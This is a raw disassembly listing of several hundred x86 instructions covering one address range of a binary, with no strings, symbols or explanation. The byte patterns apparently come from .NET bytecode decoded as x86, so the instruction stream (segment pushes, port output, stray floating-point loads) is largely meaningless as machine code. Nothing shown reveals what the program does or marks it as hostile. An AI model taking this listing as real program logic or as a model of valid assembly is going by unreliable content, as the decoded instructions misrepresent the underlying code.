  4036a9:	0a 28                	or     (%eax),%ch
  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 f4             	es jb  0x4036c6
  4036d2:	23 00                	and    (%eax),%eax
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	06                   	push   %es
  40372d:	24 00                	and    $0x0,%al
  40372f:	70 28                	jo     0x403759
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 70 21 00       	and    $0x217072,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 0c                	jb     0x403786
  40377a:	24 00                	and    $0x0,%al
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 22 24 00       	and    $0x242272,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 2c 24 00       	and    $0x242c72,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 36 24 00       	and    $0x243672,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 3c                	jb     0x403809
  4037cd:	24 00                	and    $0x0,%al
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 50             	or     0x50(%edx),%dh
  4037d8:	24 00                	and    $0x0,%al
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	54                   	push   %esp
  4037ea:	24 00                	and    $0x0,%al
  4037ec:	70 72                	jo     0x403860
  4037ee:	5e                   	pop    %esi
  4037ef:	24 00                	and    $0x0,%al
  4037f1:	70 6f                	jo     0x403862
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 6a             	or     0x6a(%edx),%dh
  4037f9:	24 00                	and    $0x0,%al
  4037fb:	70 72                	jo     0x40386f
  4037fd:	76 24                	jbe    0x403823
  4037ff:	00 70 6f             	add    %dh,0x6f(%eax)
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 82 24 00       	and    $0x248272,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 8c 24 00       	and    $0x248c72,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 9c 24 00       	and    $0x249c72,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 a8             	or     -0x58(%edx),%dh
  403859:	24 00                	and    $0x0,%al
  40385b:	70 72                	jo     0x4038cf
  40385d:	9c                   	pushf
  40385e:	24 00                	and    $0x0,%al
  403860:	70 6f                	jo     0x4038d1
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 b2             	or     -0x4e(%edx),%dh
  403868:	24 00                	and    $0x0,%al
  40386a:	70 72                	jo     0x4038de
  40386c:	2c 24                	sub    $0x24,%al
  40386e:	00 70 6f             	add    %dh,0x6f(%eax)
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 be 24 00       	and    $0x24be72,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 d6 24 00       	and    $0x24d672,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 e8 24 00       	and    $0x24e872,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 fc 24 00       	and    $0x24fc72,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 10 25 00       	and    $0x251072,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 6a                	jb     0x40395f
  4038f5:	21 00                	and    %eax,(%eax)
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 1a 25 00       	and    $0x251a72,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 26             	adc    %esi,0x26(%edx)
  40399e:	25 00 70 28 8a       	and    $0x8a287000,%eax
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	0a 72 2c             	or     0x2c(%edx),%dh
  4039a8:	25 00 70 28 68       	and    $0x68287000,%eax
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	0a 72 58             	or     0x58(%edx),%dh
  4039b2:	25 00 70 73 a1       	and    $0xa1737000,%eax
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 0a                	or     (%edx),%cl
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 96    	or     0x96720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 ae                	jb     0x4039c4
  403a16:	25 00 70 13 04       	and    $0x4137000,%eax
  403a1b:	dd 31                	fnsave (%ecx)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 72 b6             	add    %dh,-0x4a(%edx)
  403a22:	25 00 70 07 6f       	and    $0x6f077000,%eax
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 ae                	jb     0x4039f5
  403a47:	25 00 70 13 04       	and    $0x4137000,%eax
  403a4c:	dd 00                	fldl   (%eax)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	00 11                	add    %dl,(%ecx)
  403a52:	04 2a                	add    $0x2a,%al
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 6a             	add    %dh,0x6a(%edx)
  403b3e:	21 00                	and    %eax,(%eax)
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
